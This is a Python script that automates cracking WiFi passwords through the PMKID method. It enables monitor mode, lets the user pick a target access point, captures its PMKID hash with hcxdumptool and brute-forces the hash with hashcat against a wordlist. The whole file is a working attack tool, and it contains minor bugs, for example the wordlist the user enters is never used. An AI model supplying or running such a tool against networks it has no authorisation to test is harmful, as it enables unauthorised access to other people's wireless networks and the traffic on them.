import os
import subprocess

'''
Clone below application and verify require aplication
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/ZerBea/hcxdumptool.git
git clone https://github.com/ZerBea/hcxtools.git
Install below
1: apt-get update
2: apt-get dist-upgrade -y
3: apt-get install libssl-dev
4: apt-get install libz-dev
5: apt-get install libpcap-dev
6: apt-get install libcurl4-openssl-dev
'''



interface="wlan0mon"
path="/Pentesting/Wifi_tools/PMKID/bssid/bssid.txt"


print('Switching to monitoring mode')
os.system('sleep 4')
os.system('clear')
subprocess.call(["airmon-ng", "stop", "wlan0"])
subprocess.call(["airmon-ng", "start", "wlan0"])
os.system('clear')
os.system('ifconfig')
os.system('sleep 4')
os.system('clear')


print('Monitoring starting, Please select WIFI to decrypted (BSSISD only)')
os.system('sleep 2')
os.system('clear')
os.system("xterm -e 'airodump-ng wlan0mon; read'")

bssid = raw_input('Please enter bssid for wifi device you want to decrypted\n')
s = open(path, 'w')
s.write(bssid)
s.close()
subprocess.call(["bssid.sh"])



os.chdir('/Pentesting/Wifi_tools/PMKID/hcxdumptool')
os.system('rm hash')
os.system("xterm -e 'hcxdumptool -o hash -i wlan0mon --filterlist=/Pentesting/Wifi_tools/PMKID/bssid/update_bssid.txt --filtermode=2 --enable_status=3; read'")
subprocess.call(["hcxpcaptool", "-z", "hash2", "hash"])
os.system('mv hash2 /Pentesting/Wifi_tools/PMKID/hashcat')
os.chdir('/Pentesting/Wifi_tools/PMKID/hashcat')
wordlst = raw_input('Please enter name of the wordlist that you want use, wordlst1.txt or wordlst2.lst or wordlst3.lst: \n')
os.system("xterm -e './hashcat -m 16800 hash2 /root/wordlists/wordlst --force; read'")

wait = raw_input('Please wait for decrypting to finish, Then hit enter key: \n')
subprocess.call(["./hashcat", "-m", "16800", "hash2", "--force", "--show"])
os.system('sleep 4')
subprocess.call(["airmon-ng", "stop", "wlan0mon"])
exit(0)
